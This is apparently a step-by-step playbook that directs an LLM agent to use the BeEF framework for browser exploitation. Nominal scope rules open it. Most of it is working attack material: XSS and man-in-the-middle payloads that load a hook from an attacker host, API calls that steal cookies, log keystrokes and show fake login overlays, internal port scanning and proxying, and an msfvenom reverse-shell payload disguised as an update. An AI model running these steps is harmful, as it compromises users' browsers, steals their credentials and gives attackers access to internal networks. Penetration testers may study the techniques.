# BeEF Browser Exploitation Framework Skill

## Overview
Complete methodology for using the Browser Exploitation Framework (BeEF) to hook
browsers via XSS, perform post-exploitation through JavaScript, social engineering
attacks, internal network discovery, credential harvesting, session hijacking,
tunneling, and Metasploit integration.
This is the LLM agent's step-by-step playbook — follow it top to bottom.

## Scope Rules
1. Only inject hooks into explicitly authorized targets.
2. XSS vulnerability must be confirmed before hook injection.
3. Social engineering modules require explicit authorization per-engagement.
4. Clean up all hooks and persistence after engagement.
5. Record ALL modules executed and data collected.

---

## Phase 1: BeEF Setup & Authentication

### 1.1 Starting BeEF
```bash
# Start BeEF server
beef-xss

# Or with custom config
beef-xss --config /etc/beef-xss/config.yaml

# Default credentials: beef / beef (change in production!)
# Web UI: http://LHOST:3000/ui/panel
# Hook URL: http://LHOST:3000/hook.js
# API base: http://LHOST:3000/api/
```

### 1.2 API Authentication
```bash
# Authenticate and get API token
TOKEN=$(curl -s -X POST http://beef:3000/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"beef","password":"beef"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "BeEF API Token: $TOKEN"

# Verify authentication
curl -s "http://beef:3000/api/hooks?token=$TOKEN"
```

### 1.3 Configuration Tuning
```yaml
# Key config settings (/etc/beef-xss/config.yaml):
beef:
  credentials:
    user: "beef"
    passwd: "StrongPassword123"
  http:
    port: 3000
    public: "ATTACKER_PUBLIC_IP"    # For external hooks
    hook_file: "/hook.js"
  extension:
    metasploit:
      enable: true                   # Enable MSF integration
      host: "127.0.0.1"
      port: 55552
    social_engineering:
      enable: true
    network:
      enable: true
```

---

## Phase 2: Hook Injection Techniques

### 2.1 Basic Hook Script
```html
<!-- Standard hook injection via XSS -->
<script src="http://ATTACKER_IP:3000/hook.js"></script>

<!-- Minified / obfuscated versions -->
<script src="http://ATTACKER_IP:3000/hook.js" type="text/javascript"></script>

<!-- Via image error handler -->
<img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER_IP:3000/hook.js';document.head.appendChild(s);">

<!-- Via event handlers -->
<body onload="var s=document.createElement('script');s.src='http://ATTACKER_IP:3000/hook.js';document.head.appendChild(s);">

<!-- Via stored XSS in input fields -->
"><script src=http://ATTACKER_IP:3000/hook.js></script>
```

### 2.2 Stealthy Hook Injection
```html
<!-- HTTPS hook (requires SSL cert on BeEF) -->
<script src="https://ATTACKER_DOMAIN:3000/hook.js"></script>

<!-- Hidden iframe injection -->
<iframe src="http://ATTACKER_IP:3000/demos/basic.html" style="display:none"></iframe>

<!-- Via Man-in-the-Middle (bettercap) -->
# Inject hook into all HTTP traffic on the network
# bettercap script: beef-inject.js
function onResponse(req, res) {
    if(res.ContentType.indexOf('text/html') != -1) {
        var body = res.ReadBody();
        res.SetBody(body.replace('</head>',
            '<script src="http://ATTACKER_IP:3000/hook.js"></script></head>'));
    }
}
```

### 2.3 Persistence Hooks
```javascript
// Man-in-the-Browser persistence — hook survives page navigation
// BeEF module: persistence/confirm_close_tab
// Traps the user with "Are you sure you want to leave?" dialogs

// IFrame-based persistence
// Opens the real site in an iframe, keeps hook in parent window
// BeEF module: persistence/iframe_above

// Pop-under persistence
// Opens hidden window that maintains hook while user browses
```

---

## Phase 3: Information Gathering via Hooked Browser

### 3.1 Browser & System Fingerprinting
```bash
# List hooked browsers
curl -s "http://beef:3000/api/hooks?token=$TOKEN" | python3 -m json.tool

# Get detailed browser info for a session
curl -s "http://beef:3000/api/hooks/$SESSION_ID?token=$TOKEN"

# Modules for information gathering:
# - Browser fingerprinting: browser/get_all_cookies
# - System info: host/get_system_info
# - Geolocation: host/get_geolocation
# - Internal IP: network/get_internal_ip
# - Webcam: host/get_webcam (requires permission)
# - Screenshot: host/get_screenshot
```

### 3.2 Module Execution via API
```bash
# List all available modules
curl -s "http://beef:3000/api/modules?token=$TOKEN" | python3 -m json.tool

# Search for specific module
curl -s "http://beef:3000/api/modules?token=$TOKEN" | python3 -c "
import sys,json
modules = json.load(sys.stdin)
for mid, mod in modules.items():
    if 'cookie' in mod.get('name','').lower():
        print(f'{mid}: {mod[\"name\"]}')
"

# Execute a module
curl -s -X POST "http://beef:3000/api/modules/$SESSION_ID/$MODULE_ID?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}'

# Get module results
curl -s "http://beef:3000/api/modules/$SESSION_ID/$MODULE_ID/results?token=$TOKEN"
```

### 3.3 Cookie and Credential Harvesting
```bash
# Steal all cookies
MODULE_ID=$(curl -s "http://beef:3000/api/modules?token=$TOKEN" | \
  python3 -c "import sys,json; m=json.load(sys.stdin); [print(k) for k,v in m.items() if 'get_cookie' in v.get('class','')]")

curl -s -X POST "http://beef:3000/api/modules/$SESSION_ID/$MODULE_ID?token=$TOKEN" \
  -H "Content-Type: application/json" -d '{}'

# Keylogger activation
# Module: browser/hooked_domain/get_logged_keys
# Captures all keystrokes on the hooked page

# Clipboard theft
# Module: host/get_clipboard

# Form grabber — captures all form submissions
# Module: browser/hooked_domain/get_form_values
```

---

## Phase 4: Social Engineering via BeEF

### 4.1 Fake Login Dialogs
```bash
# Pretty Theft — fake login overlay matching the site's style
# Module: social_engineering/pretty_theft
curl -s -X POST "http://beef:3000/api/modules/$SESSION_ID/$PRETTY_THEFT_ID?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"choice":"Facebook"}'
# Options: Facebook, LinkedIn, Windows, YouTube, Generic, Custom

# Fake Notification Bar
# Module: social_engineering/fake_notification_bar
# Mimics Chrome/Firefox notification bar for "plugin update needed"
```

### 4.2 Fake Update Prompts
```bash
# Fake Flash Update
# Module: social_engineering/fake_flash_update
# Prompts user to download "Flash update" → delivers payload

# Chrome Extension Install
# Module: social_engineering/chrome_extension_popup

# Fake Java Applet
# Module: social_engineering/fake_java
```

### 4.3 Clipjacking / UI Redress
```bash
# Clickjacking
# Module: social_engineering/clickjacking
# Overlay transparent iframe over the page

# Tab nabbing
# Module: social_engineering/tabnabbing
# When user switches tabs, replace page content with fake login
```

---

## Phase 5: Network Discovery & Pivoting

### 5.1 Internal Network Scanning
```bash
# Get internal IP of hooked browser
# Module: network/get_internal_ip

# Port scan internal network from hooked browser
# Module: network/port_scanner
curl -s -X POST "http://beef:3000/api/modules/$SESSION_ID/$PORTSCAN_ID?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"rhosts":"192.168.1.1-254","ports":"22,80,443,445,3389,8080,8443,3306,5432"}'

# Ping sweep
# Module: network/ping_sweep
curl -s -X POST "http://beef:3000/api/modules/$SESSION_ID/$PING_ID?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"rhosts":"192.168.1.1-254"}'

# Network fingerprinting
# Module: network/fingerprint_network
# Identifies network devices (routers, printers, NAS) via known signatures
```

### 5.2 Cross-Origin Scanning
```bash
# WebRTC internal IP leak
# Module: network/get_internal_ip_webrtc

# DNS enumeration via hooked browser
# Module: network/dns_enumeration

# Detect internal web applications
# Module: network/detect_internal_hosts
# Checks for common internal services (Jenkins, Grafana, phpMyAdmin, etc.)
```

### 5.3 BeEF Tunneling Proxy
```bash
# Use hooked browser as a proxy to access internal network
# The tunneling proxy sends HTTP requests through the hooked browser

# Enable in BeEF:
# Extensions > Proxy > Enable

# Configure browser proxy to: http://beef:6789
# All requests route through the hooked browser's network context
# Access internal web applications the hooked browser can reach

# Usage:
curl --proxy http://beef:6789 http://192.168.1.1/admin
curl --proxy http://beef:6789 http://internal-jenkins:8080/
```

---

## Phase 6: Browser Exploitation

### 6.1 Metasploit Integration
```bash
# Start Metasploit RPC for BeEF integration
msfrpcd -U msf -P msf123 -f

# BeEF config.yaml must have:
# extension.metasploit.enable: true
# extension.metasploit.host: "127.0.0.1"
# extension.metasploit.port: 55552
# extension.metasploit.user: "msf"
# extension.metasploit.pass: "msf123"

# Launch browser exploits via BeEF → Metasploit
# Module: exploits/beefautorun (auto-launch exploits for detected browser)
# Module: exploits/browser_autopwn2

# Manual MSF browser exploit
msfconsole -q -x "
use exploit/multi/browser/autopwn2
set LHOST ATTACKER_IP
set SRVPORT 8081
set URIPATH /update
run
"
# Then redirect hooked browser to http://ATTACKER_IP:8081/update
```

### 6.2 Drive-By Download
```bash
# Serve payload and trick browser into downloading
# Module: social_engineering/fake_notification_bar
# Module: social_engineering/fake_flash_update

# Custom payload delivery
# Generate payload with msfvenom:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > update.exe

# Serve via BeEF module that prompts download
```

### 6.3 WebSocket Hijacking
```bash
# If the target app uses WebSockets
# Module: network/websocket_steal
# Intercept WebSocket connections through the hooked browser
```

---

## Phase 7: Mass Automation

### 7.1 Auto-Run Rules
Configure BeEF to automatically execute modules on new hooks:
```yaml
# In BeEF config — autorun rules
autorun:
  enable: true
  rules:
    - name: "auto_cookie_steal"
      modules:
        - "browser/hooked_domain/get_cookie"
    - name: "auto_internal_ip"
      modules:
        - "network/get_internal_ip_webrtc"
    - name: "auto_fingerprint"
      modules:
        - "host/get_system_info"
```

### 7.2 Python Automation Script
```python
import requests, json, time

BEEF_URL = "http://beef:3000/api"
token = requests.post(f"{BEEF_URL}/admin/login",
    json={"username":"beef","password":"beef"}).json()["token"]

# Monitor for new hooks
while True:
    hooks = requests.get(f"{BEEF_URL}/hooks?token={token}").json()
    for session_id, info in hooks.get("hooked-browsers", {}).get("online", {}).items():
        print(f"[+] Hooked: {info['ip']} - {info['name']} {info['version']}")
        # Auto-execute modules on each hook
        # requests.post(f"{BEEF_URL}/modules/{session_id}/MODULE_ID?token={token}", json={})
    time.sleep(10)
```

---

## Decision Tree — BeEF Attack Flow

```
XSS VULNERABILITY CONFIRMED
│
├── Inject BeEF hook.js via XSS
│   ├── Stored XSS → persistent hook
│   ├── Reflected XSS → phishing link with hook
│   └── MITM injection → hook all HTTP traffic
│
├── Browser hooked → appears in BeEF panel
│
├── INFORMATION GATHERING
│   ├── Browser/OS fingerprint
│   ├── Cookie harvesting
│   ├── Keylogger activation
│   └── Internal IP discovery
│
├── SOCIAL ENGINEERING
│   ├── Fake login overlays
│   ├── Fake update prompts
│   └── Clipjacking
│
├── NETWORK DISCOVERY
│   ├── Internal port scanning
│   ├── Ping sweep
│   ├── Service fingerprinting
│   └── Tunneling proxy (access internal net)
│
└── EXPLOITATION
    ├── Metasploit browser exploits
    ├── Drive-by download
    └── Credential harvesting
```

---

## Evidence Collection
1. `evidence.json` — hook confirmation, modules executed, data collected
2. `credentials.json` — harvested cookies, keylogger output, fake login captures
3. Screenshots of BeEF panel showing hooked browsers
4. Network scan results from internal discovery
5. Module execution logs with timestamps

## MITRE ATT&CK Mappings
- T1189 — Drive-by Compromise
- T1185 — Browser Session Hijacking
- T1557 — Adversary-in-the-Middle
- T1056.004 — Credential API Hooking
- T1059.007 — JavaScript

## Deep Dives
Load references when needed:
1. BeEF module reference: `references/beef_modules.md`
2. Hook injection techniques: `references/hook_injection.md`
3. Tunneling proxy setup: `references/tunneling.md`

## Success Criteria
- BeEF hook injected via confirmed XSS
- Browser hooked and visible in panel
- At least one information gathering module executed
- Credentials or session tokens harvested
- Internal network discovery performed
- All evidence documented with timestamps
